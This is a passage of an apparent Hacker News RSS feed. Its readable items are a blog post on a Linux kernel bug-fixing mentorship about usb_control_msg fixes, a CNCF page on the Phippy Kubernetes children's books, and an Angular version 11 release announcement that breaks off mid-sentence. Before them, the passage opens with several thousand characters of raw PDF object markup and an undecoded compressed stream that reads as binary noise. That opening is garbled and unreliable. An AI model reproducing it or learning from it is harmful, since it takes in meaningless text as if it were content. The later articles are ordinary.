      /f-9-0 18 0 R
      /f-2-0 7 0 R
      /f-1-0 6 0 R
      /f-6-0 11 0 R
      /f-10-0 19 0 R
      /f-7-0 12 0 R
   &gt;&gt;
&gt;&gt;
endobj
20 0 obj
&lt;&lt; /Type /Page
   /Parent 1 0 R
   /MediaBox [ 0 0 611.999983 791.999983 ]
   /Contents 16 0 R
   /Group &lt;&lt;
      /Type /Group
      /S /Transparency
      /CS /DeviceRGB
   &gt;&gt;
   /Resources 15 0 R
&gt;&gt;
endobj
22 0 obj
&lt;&lt; /Length 23 0 R
   /Filter /FlateDecode
&gt;&gt;
stream
xœ•ZÉ®+Ç
Ý÷WèÔ®y-dáäY^H-É€°³Èï‡‡d
­áù†ïkU×Àb‘‡‡¬þ}1‡\Ý!Y{8æjÜÿ&lt;ü›Zñß¿¾»˜Ã/ÿY¾ÿ²¤µf_¸]«YsªµæCÊhJµøÃ—ß–ïGs4{øòX~:kÜÙÕ“ñç£�ádÂùhO&amp;žéOjM&amp;scA#Þ›äð«w¬‹¹ð¯Ëùç/?,¶®¥TO¢|¹a‰ëÙ•“ÙÎÞœÌÍÜÍCæµÆZŒ²Žæ°ÞÇÏÄ�V{æ…Þcyz‰v�ÇŠ—ñd/&lt;ñÆÜíÕnV÷boúïÝ:ôYwfáFÈëêš}ŠM^g¡1dV»Ñ£ó4u4ÎZÄ;5‘X:ÏBÜÐ=©&nbsp;Xà/_ôÈþþ×ƒY]­‡ÿRÃôÿ¯ËO?S“9Ük;üNç‚ŽøK¾ÒùáØ¶ß–âÖêáhmZ}Ž‡ß­¥º5�ôÿ:üãðãòy‚èVcMàüêk¡	r\«›Zþt:Ø¸Ÿ"¿†ÿo’¶”y½é7Òö]ŒYCö“&amp;2zLî›UA&gt;±:?«¢µ|ó6†½é›¥€ŸX7‹ufçŸåèþNŽžÉ•�L©�ÎDšÇÖ(òê�«%ª§×ÉÓo&amp;’+}!—¾Ÿ¹ð.ˆ6«Îè‹'{†ƒŠ1óoFø&amp;F’cZm2i±™Ý_üØd[Ø)1èrvédiêèù_ÈS7[¨ÓÍ\Íf�¹ZÃÞAb–!æùXJ0‚K7èR×šèx°i}´&gt;®&gt;–ZÓ!–²ÖbjIºi7múB»÷$y€h¤Ú¬ š«gönj¬'ÕC2y8~4@êÆoRV"ï–î7ÚD0üÊ…K@V_$tì&amp;(ý¥y	�ð&amp;bëËx´óì‘VÊô°þf£g€1f˜0«€v1éÜ&amp;J€&gt;˜qF•Ð{3w†T€ÝÐ{(Õ�ŒHŸ|´Ý@gr„¾Œ½`†àéø/uÑ_V±&gt;±šw
;„ÅxÚ¢mLRixÙpù$ÚÄpš/a:&amp;‰IqèX½öLX°Þ‰%ËÉÉ$�Ã‘ä9�~½È]êô“¸iÁó&amp;ž—s—¡)R¾išâ£dùoÒq”L6¹JßšYçÙ¬¹ÓFÖŸÉlRëâ^»À6ƒ“M¡…|
f#v¼é;+š„¹rRCL™Æ­°˜
O‚c“-›éaXiî¾¾Á`sÛ%ìî½õm:AxÕœºåãuŒ7¤XUÌ‹Ý‘âš9»õUEÅ7õ¢£Ïôë:Ôàsç ?mû—w±1¼ÌJ´ÚÁÀœyÆ­û}4ì«Y&lt;Ž1â¾2+ïÊJo+²	°ƒ­%+ö¤vž@°ËùË¯o°Ë"&amp;
ˆÑ¬Ö¥1|2Ó=VÆJ
¼01ió™}Å³V«@›	Þ0Ëic²ZïÑŠG6¾¸{ÀAüIfMCRh�žæUÁ¨*qzU�óˆá´5O±Œh5oUs%e×÷Êq!SäË&lt;ƒÏ«Íñ­v`øl]$,l»	îï,YXCpÄïG"W�ô
6}¢&nbsp;B«šÃ®õ'ØCUÌ˜«Y…cŸa¦k™ÅRTªMº¸g

Ü5‹‚\¢.ïµDŠ'ª*±…¯i)
í¦Ð´o5EˆµÚêy–¯iªÒŽèÌxÍ"hŠS	/À¶ÁÔh�9%Œ)trz`)dsÁàákŒÈ°&amp;í
)Z�yhV'×–Êàs™fævŽº
.Uuê[&lt;È'6Ê]8“Q×Ž´Ÿª“2y�
èÞW[dƒ»�öŸÚ©72
–ADq]ÐKã®÷��£¼e ãq
ZòÖR!íjaÚŽ£$¶µC÷;[×ð|ÈV²ž‚aÖP•}a¿É´5‰ÍðqºDÔ�2—w�Ê[,dïB2DJ²Dñ‚‡Ä–·QÑêö€²–´0x°’"„I�µ�™÷h°Ú4‰’|‘»;ÉÉ-ä°qÈlùÁÓŽlX£+Ùg$Y¦ÔÂrQæÿ! °)g	ã-I(·´´x•%ÓI#4?;Š
¦È^H-üÂ1.ô”]ˆöGÜßu�6Gd‚öâö6Å5^«Šu)µdï¤}øä²Í/ˆ=•S_ŽÀ@%«€…‘0Lbƒl¶¢±Î1Z&lt; ¦Ž&nbsp;üÌHÁnzÕ‰–˜äzVŠLóó)&gt;R&amp;D¦†ø˜›ÒÕWxs¤½÷ñ‘%‚2žh~ªcü¤Z÷€DëÉúÅõžŒ?Îéc§Ò�„ñ?á‚°'RˆU4ç}‡Ž@4$¶pjËŒgó—ÐÈY+®ž‚íhi¡P
Ð‘=*õ„d¾+ÑŸ¤‚,¢i«t+Jš@B~ˆ¾”S8¯Õ%¡ÆûŠÿ@L\%Ë³EÆS ·ù­â›jPˆ¥ÛÏ”
a—�²`Ç.¤kQÏÁ Öf[Ì·
~Eû”©Ç˜rxAiÅå]²5	¥nš/+í3æ6Ê£x:;Í~0Ù‰‡ƒifã½Þ°ºÜ­n1Ú¡Ç
©�dé)ÓH$w¿³æâ�”Å&lt;(k§9áY-wâ‘v�d–ö=C¯\&gt;sedÅqÉàÚ5 ¦ï5Ìz�nè|ÓÈÖ%“7dœd´[W+
»Éˆ¾‹–J*·ì9ç•‚."éÙ]ùÂdåÔ]ˆç¡óC1I¬DÞ™h¨ÏU¤BKº«æ5t·óí*èé9Á­-ÁÝæLì¹$PÔ¨-–±r
QÔj÷t�y#CÉšßÍ
BÍxÂë2å…h]õbÂ˜±¿¼KdmÒ\ºÊZûÈ	)ƒ {¶9A–íþ)_º67Ò&nbsp;NB£†z¶:k“±Ðõš�m€Có;¢«ÎT
Ø�)!¬r©Š±ÑCúó&nbsp;ˆž›ê•#pŸØkÇFTïÔÅ‹–-ˆó OB%:‰
LdrNªïÖYä9â³°Þ¥H6ÄÒú’_T&nbsp;8§¤Ñ
yu
»up&nbsp;s+�¤�³tX­YìXF±“rïÕ¦€»œÓ%Ñií945”»1’UfkJý;EèÓµàŠòPj‰ílGœeÉÄêýÒgiu(¥š¯%'²@Î7:†xOXqéÌ…ÍM(tÙó_8¢7�ò¢º›Ž!.Dÿo3Ëˆ-_ï¦Q—_³RÌF'¦,º6z¤^g)ÍD1»›ôSø[)�cs¨h)&lt;\Üo.2íËq?[¼»qI,²v;âw­.4Êeœ.�=y&nbsp;ÅˆèíýÀ&nbsp;¾PoÂY“·�XLp�&lt;„�,êåÛ8gË¯×@[^¬P\{xÂÐ©·ÌçxÉbH
KhïUD½Ì@´Ëf/Àdá^Íx"&amp;´Ä–v…ßÍŒÞyàÒ:IjÇÀŒ!(ÎVŽ�Å¦[WØ’+^¸ú›è`n‹Ô�&amp;øçi':“w9¦L&lt;¶[Qu™Wà3‰û  ;ì(ÿÙðØìn\é±jN÷s“NËÍÖ�2åŠ\qõ¦L¥¼)Ÿ•4Ãä)Œð¯†~4ŽrR?�wÍ}f Ù…ŠÅ}Ì&gt;±YK9å!u
Ä kxWœûPU¡ÌkMD�1&lt;®…¢N&gt;ç–S"SöFÉ
õÉrd�¼/TÛ’hÏsñþÂî-5·[(Ú¾Öd8OF­©¥f^ò†ÛûB3êw…z}(2ãµˆÌÇ³«ûqÍÙ0ò]8Ô•§r�oÈºölŠ	¤«=]™~TŽýIXMêùjHm¾[:DTn8Ü%‚Öí'riå/ì&gt;s„ëœ‘)Hæ‚ÞÁM�S9—Ü		¯‹T`{MÌ»0˜òžÉÁ%»˜(¿µñ^AbÑ5&amp;ö7_›Œ[„)ƒòßu-™p:�¹–¿ôÚuçR(­ÛŒ¦gd•ðùKi-�Õz4‘žûsPÆí(ç”O…Öo‘ŽþäÔÄ‹f2žb`Qõþ©¤ßÔµçuqÎyéïOAw÷{±LÑ•mNäôø)…</h[þg*à-üñ9òyq3ô?n2®&ž�mš®¸‡93×ñ«ìvvu#;.¸ƒšðj…:ú!‰b¹&�yû\çj·�øï¸jß²”ã3y–w-‡„ã¹àfg¹ù¥qbëã></k“ið"{¬€¹éfº…é‡è5ò></swï.></l}k&r></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://people.idsia.ch/~juergen/fastestuniverse.pdf">http://people.idsia.ch/~juergen/fastestuniverse.pdf</a></em></p>]]>
            </description>
            <link>http://people.idsia.ch/~juergen/fastestuniverse.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065400</guid>
            <pubDate>Thu, 12 Nov 2020 01:37:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux Kernel Bug Fixing Mentorship]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065177">thread link</a>) | @simonpure
<br/>
November 11, 2020 | https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship | <a href="https://web.archive.org/web/*/https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="634481719919165440">
                    
                        
                            <h3><a href="https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship">Linux Kernel Bug Fixing Mentorship</a></h3>
                        <p>I recently finished a three months long <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmentorship.lfx.linuxfoundation.org%2F&amp;t=ODEyOWYwYmViYjczZTZmZjE1M2Q1MDVhMTM3ZmNmM2RhMzI0MTgxMSxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605414214" target="_blank">CommunityBridge(now knows as LFX)</a> mentorship with <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.linuxfoundation.org%2F&amp;t=ODg0ZDA0Mjc5ZGQyNGQ5OWYxMGU1YzlkMTQ5YjIzY2E3MjFmODQ0YSxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605414214" target="_blank">The Linux Foundation</a>. I worked as a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmentorship.lfx.linuxfoundation.org%2Fproject%2Ff06db0d5-537e-4e0f-8ca4-0a471f95a04d&amp;t=ZjVkODE2OTczM2IyNDA5MWU1OWJlMTZkMzlkYmI4NDllYjVmY2ViOCxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605414214" target="_blank">Linux kernel bug fixing</a> mentee under <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.kroah.com%2Flog%2Fabout.html&amp;t=NTk0MjQ1YWUyZWIxNzIwOWIxZWQxMzc0NDIyODZmYTQ3YjM2N2Y2NixxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605414214" target="_blank">Greg Kroah-Hartman</a>. This post is about my experience and work during the mentorship program.</p><p>In
the first week of the mentorship program, I learned about debugging
techniques for the Linux kernel, how to use decode_stacktrace.sh, and
what is CONFIG_KASAN. These were all unfamiliar concepts for me, and
I found the mentors’ learning resources very useful. My first task
was to write summaries of my understanding of these concepts. I found
these summaries quite helpful while fixing real bugs in the kernel
later in the mentorship.</p><p>I
was also unfamiliar with syzkaller and syzbot before becoming part of
the mentorship. So after completing the summary tasks, I spent the
next few days getting familiar with these tools. The syzbot dashboard
has hundreds of reported bugs, and I found it a little challenging to
decide which one I should pick first.</p><p>In
the meantime, my mentor, Greg KH, redirected me towards an ongoing
discussion regarding a bug produced due to a short read in
usb_control_msg() call. There existed a few ways to fix it, and after
discussing them with the mentor, I proposed a fix. The patch
generated a fair amount of discussion, and I also received comments
that the proposed fix wasn’t the right way to handle the bug. The
discussion also concluded that many other usages of
usb_control_msg(), which don’t have proper error checks, are also
prone to similar bugs. I fixed the bug by adding an adequate error
check to prevent short reads in the caller, and Greg KH wrote new
wrapper functions for usb_control_msg() to be used in such scenarios
to avoid similar bugs.</p><p>Apart
from this bug, I also explored two other bugs. I found them
fascinating because inspite of being listed on the dashboard, their
reproducers weren’t triggering any issues. I learned that a commit
had fixed one of these bugs, and it was yet to be applied to all
kernel trees. But the other bug didn’t have any reported fix, yet the
reproducer wasn’t triggering the issue. I discussed this with the
mentor and learned that the syzbot dashboard isn’t quite dynamic. So
we decided to mark the bug as “invalid.” On a later
discussion with other community members I learned that it was not a
good idea, and I’ve ended up marking a potentially valid bug as
“invalid”!</p><p>As
a follow-up work on the first usb_control_msg() bug, I submitted a
cleanup patch series for some of the drivers/net/usb files. One of
those patches ignored the GFP_NOIO flag used in the original code and
replaced it with the GFP_KERNEL flag used in the new wrapper API
functions. It was a blunder that resulted in a discussion to add a
new argument for memory allocation flags in the wrapper functions.
Now the wrapper functions take memory flags as arguments preventing
mentees like me from repeating such blunders.</p><p>I
continued the follow-up work by investigating drivers/usb/serial/
files. I noticed that many usages of usb_control_msg() rely on its
return value of the number of bytes read/wrote. And the new wrapper
functions don’t retain that information. So I had a discussion with
the mentor about if that information was really necessary. We
concluded that it is almost always unnecessary, and having an error
code returned is a better way.</p><p>I
ended up submitting 19 patches as part of the mentorship program. The
first one is a fix for the usb_control_msg() short read bug. The next
three are cleanup patches for usb_control_msg() wrapper functions for
drivers/net/usb files, which were rejected because of the memory flag
blunder. And the remaining 15 are usb_control_msg() cleanup patches
for drivers/usb/serial/ files. Greg KH has reviewed them, but they
are not yet merged in the mainline.</p><p>Apart
from the bug fixing, I also learned few other interesting things
about the Linux kernel and its developer community, like how we test
various changes in the kernel and why we strictly use plain text
emails. I also attended talks at the Linux Plumber’s Conference and
the Open Source Summit Europe during the mentorship, which helped me
catch up with what is happening in the kernel world, learn new
things, and make new connections.</p><p>
My
mentorship program experience has been fantastic, and I recommend it
to everyone interested in pursuing Linux kernel development and
looking for mentoring. I am heartily thankful to my mentor Greg KH,
Shuah Khan, and The Linux Foundation, for providing me with this
opportunity and a great learning experience. 
</p><p>Patches can be found on&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flore.kernel.org%2Flkml%2F%3Fq%3Dhimadrispandya&amp;t=NWJjMDdkODFiMDQ5NzViNjlkNWQyOWI4OGYwNzkyYTRmNTUwMzQ0MCxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605414214" target="_blank"> https://lore.kernel.org/lkml/?q=himadrispandya.<br></a></p>
                    </article></div>]]>
            </description>
            <link>https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065177</guid>
            <pubDate>Thu, 12 Nov 2020 01:13:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Illustrated Children's Guide to Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065144">thread link</a>) | @tomasreimers
<br/>
November 11, 2020 | https://www.cncf.io/phippy/ | <a href="https://web.archive.org/web/*/https://www.cncf.io/phippy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<article>
		
<div><figure><img loading="lazy" width="472" height="487" src="https://www.cncf.io/wp-content/uploads/2020/07/phippy-01-1.svg" alt=""></figure><p><strong>Phippy</strong>&nbsp;is a simple PHP app, trying to find a home in a cloud native world.</p></div>







<div><div>




<h2>Introducing Phippy and friends</h2>












</div></div>







<div>
<div>
<figure><img loading="lazy" width="849" height="651" src="https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes.jpg 849w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-300x230.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-768x589.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-261x200.jpg 261w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-700x537.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-222x170.jpg 222w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-352x270.jpg 352w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-443x340.jpg 443w" sizes="(max-width: 849px) 100vw, 849px"></figure>




</div>



<div>
<h3>The Illustrated Children’s Guide to Kubernetes</h3>



<p><em>The Illustrated Children’s Guide to Kubernetes</em> is a simple, gentle answer a father gave his daughter when she inquisitively asked about Kubernetes. It’s dedicated to all the parents who try to explain software engineering to their children.</p>



<p>The star of <em>The Illustrated Children’s Guide to Kubernetes</em>, Phippy and her friends explain the core concepts of Kubernetes in simple terms.</p>




</div>
</div>







<div>
<div>
<h3>Phippy Goes to the Zoo</h3>



<p>Follow the tale of Phippy and her niece Zee as they take an educational trip to the Kubernetes Zoo.</p>








</div>



<div>
<figure><img loading="lazy" width="851" height="655" src="https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo.jpg 851w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-300x231.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-768x591.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-260x200.jpg 260w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-700x539.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-221x170.jpg 221w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-351x270.jpg 351w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-442x340.jpg 442w" sizes="(max-width: 851px) 100vw, 851px"></figure>
</div>
</div>







<div>
<div>
<h3>Phippy and Zee go to the Mountains</h3>



<p>Another work featuring Phippy and friends: Join Phippy and Zee on a 4-dimensional hike!</p>




</div>



<div>
<figure><img loading="lazy" width="1024" height="768" src="https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-1024x768.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-1024x768.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-300x225.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-768x576.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-267x200.jpg 267w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-700x525.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-227x170.jpg 227w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-360x270.jpg 360w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-453x340.jpg 453w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8.jpg 1367w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>







<div>
<div>
<h3>Phippy In Space: Adventures in Cloud-Native Recovery</h3>



<p>In the not-so-distant future, space outposts (cloud-native infrastructure) are the next frontier for settlement and Captain Kube is in charge of the cutting-edge Mars outpost. As the outpost has grown in size and complexity, Captain Kube needs to find solutions for many of the settlement’s growing pains. He has recruited Phippy to work with him on the outpost’s Day 2 challenges.</p>



<p>Join them on their adventure, as they journey to Mars and brainstorm solutions.</p>




</div>



<div>
<figure><img loading="lazy" width="1024" height="792" src="https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1024x792.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1024x792.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-300x232.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-768x594.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1536x1187.jpg 1536w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-259x200.jpg 259w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-700x541.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-220x170.jpg 220w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-349x270.jpg 349w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-440x340.jpg 440w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space.jpg 1568w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>















<p>The characters Phippy, Captain Kube, Goldie, and Zee and the two books are owned by The Linux Foundation, on behalf of the Cloud Native Computing Foundation, and licensed under the Creative Commons Attribution License (<a href="https://creativecommons.org/licenses/by/4.0/">CC-BY</a>), which means that you can remix, transform, and build upon the material for any purpose, even commercially. If you use the characters, please include the text “<a href="https://phippy.io/">phippy.io</a>” to provide attribution (and online, please include a link to&nbsp;<a href="https://phippy.io/">https://phippy.io</a>).</p>



<p>The characters and the two books were created by&nbsp;<a href="https://twitter.com/technosophos">Matt Butcher</a>,&nbsp;<a href="https://twitter.com/karenhchu">Karen Chu</a>, and&nbsp;<a href="https://www.baileyjeanstudio.com/">Bailey Beougher</a>&nbsp;and donated by Microsoft to CNCF. Goldie is based on the Go Gopher, created by&nbsp;<a href="https://blog.golang.org/gopher">Renee French</a>, which is also licensed under&nbsp;<a href="https://creativecommons.org/licenses/by/3.0/" target="_blank" rel="noreferrer noopener">CC-BY</a>.</p>



<p>Images of Phippy, Captain Kube, Goldie, and Zee are available in the CNCF&nbsp;<a href="https://github.com/cncf/artwork/blob/master/examples/other.md#phippy--friends-group-logos">artwork</a>&nbsp;repo in svg and png formats and in color, black, and white.</p>
	</article>
</div></div>]]>
            </description>
            <link>https://www.cncf.io/phippy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065144</guid>
            <pubDate>Thu, 12 Nov 2020 01:10:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Version 11 of Angular Now Available]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25065091">thread link</a>) | @mgechev
<br/>
November 11, 2020 | https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7 | <a href="https://web.archive.org/web/*/https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@markathompson?source=post_page-----74721b7952f7--------------------------------" rel="noopener"><img alt="Mark Techson" src="https://miro.medium.com/fit/c/96/96/1*2hqK0rVXWghtk_RLFx33oA.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Photo of a Torch Ginger by Jules Kremer" src="https://miro.medium.com/max/2368/0*55kr1t601sp22pkE" width="1184" height="1091" srcset="https://miro.medium.com/max/552/0*55kr1t601sp22pkE 276w, https://miro.medium.com/max/1104/0*55kr1t601sp22pkE 552w, https://miro.medium.com/max/1280/0*55kr1t601sp22pkE 640w, https://miro.medium.com/max/1400/0*55kr1t601sp22pkE 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*55kr1t601sp22pkE?q=20"></p></div></div></div><figcaption>Photo of a Torch Ginger by Jules Kremer</figcaption></figure><p id="1feb"><strong>Welcome to the Angular version 11 release.</strong></p><p id="1877">Version 11.0.0 is here and we’ve got some great updates for Angular developers everywhere. This release has updates across the platform including the framework, the CLI and components. Let’s dive in!</p><h2 id="1182">Updates on Operation Byelog</h2><p id="593b">When we shared <a href="https://angular.io/guide/roadmap" rel="noopener">Angular’s Roadmap</a>, one of the items was Operation Byelog where we committed to putting a significant engineering effort towards triaging issues and PRs until we have a clear understanding of the broader community needs. We can now report that the original goal is complete! We’ve triaged all the issues in all three of the monorepos and will continue this as an ongoing effort as new issues get reported.</p><p id="bc06">This is our commitment: Going forward all new issues reported will be triaged within 2 weeks.</p><p id="2104">In the process, we resolved a few <a href="https://github.com/angular/angular/issues/12842" rel="noopener">popular</a> <a href="https://github.com/angular/angular/issues/18469" rel="noopener">issues</a> in the <a href="https://github.com/angular/angular/issues/13011" rel="noopener">router</a> and <a href="https://github.com/angular/angular/issues/14542" rel="noopener">forms</a>.</p><p id="a1cd">Also, we’ve closed the <a href="https://github.com/angular/angular/issues/11405" rel="noopener"><em>third most popular issue</em></a><em>!</em></p><p id="5773">Now, we’re planning the next steps to support the Angular community. We’ll continue triaging and fixing issues, and work towards improving our processes for accepting community contributions.</p><h2 id="4683">Automatic Inlining of Fonts</h2><p id="6a67">To make your apps even faster by speeding up their <a href="https://web.dev/first-contentful-paint/" rel="noopener">first contentful paint</a>, we’re introducing automatic font inlining. During compile time Angular CLI will download and inline fonts that are being used and linked in the application. We enable this by default in apps built with version 11. All you need to do to take advantage of this optimization is update your app!</p><h2 id="124e">Component Test Harnesses</h2><p id="78d2">In Angular v9 we introduced Component Test Harnesses. They provide a robust and legible API surface to help with testing Angular Material components. It gives developers a way to interact with Angular Material components using the supported API during testing.</p><p id="2932">Releasing with version 11, we have harnesses for all of the components! Now developers can create more robust test suites.</p><p id="3e07">We’ve also included performance improvements and new APIs. The <em>parallel</em> function makes working with asynchronous actions in your tests easier by allowing developers to run multiple asynchronous interactions with components in parallel. The <em>manualChangeDetection</em> function gives developers access to finer grained control of change detection by disabling automatic change detection in unit tests.</p><p id="752c">For more details and examples of these APIs and other new features, be sure to check out the <a href="http://material.angular.io/cdk/test-harnesses/overview" rel="noopener">documentation for Angular Material</a> Test Harnesses!</p><h2 id="173a">Improved Reporting and Logging</h2><p id="968c">We’ve made changes to the builder phase reporting to make it even more helpful during development. We are bringing in new CLI output updates to make logs and reports easier to read.</p><figure><div><div><p><img alt="Screenshot of angular CLI output nicely formatted into columns." src="https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX" width="607" height="355" srcset="https://miro.medium.com/max/552/0*-dCa80651cnfbjpX 276w, https://miro.medium.com/max/1104/0*-dCa80651cnfbjpX 552w, https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX 607w" sizes="607px" data-old-src="https://miro.medium.com/max/60/0*-dCa80651cnfbjpX?q=20"></p></div></div><figcaption>Improved CLI output formatting</figcaption></figure><h2 id="970e">Updated Language Service Preview</h2><p id="650a">The Angular Language Service provides helpful tools to make development with Angular productive and fun. The current version of the language service is based on View Engine and today we’re giving a sneak peek of the Ivy-based language service. The updated language service provides a more powerful and accurate experience for developers.</p><p id="15e6">Now, the language service will be able to correctly infer generic types in templates the same way the TypeScript compiler does. For example, in the screenshot below we’re able to infer that the iterable is of type string.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Screenshot of intellisense style insights in Angular templates." src="https://miro.medium.com/max/3000/0*L1Tg13gdu3PCqUNN" width="1500" height="902" srcset="https://miro.medium.com/max/552/0*L1Tg13gdu3PCqUNN 276w, https://miro.medium.com/max/1104/0*L1Tg13gdu3PCqUNN 552w, https://miro.medium.com/max/1280/0*L1Tg13gdu3PCqUNN 640w, https://miro.medium.com/max/1400/0*L1Tg13gdu3PCqUNN 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*L1Tg13gdu3PCqUNN?q=20"></p></div></div></div><figcaption>Angular Language Service inferring iterable types in templates</figcaption></figure><p id="e67f">This powerful new update is still in development but we wanted to share an update as we keep preparing it for a full release in an upcoming version.</p><h2 id="48a5">Updated Hot Module Replacement (HMR) Support</h2><p id="303f">Angular has offered support for HMR but enabling it required configuration and code changes making it less than ideal to quickly include in Angular projects. In version 11 we’ve updated the CLI to allow enabling HMR when starting an application with ng serve. To get started, run the following command:</p><pre><span id="3ac4">ng serve --hmr</span></pre><p id="f3bc">After the 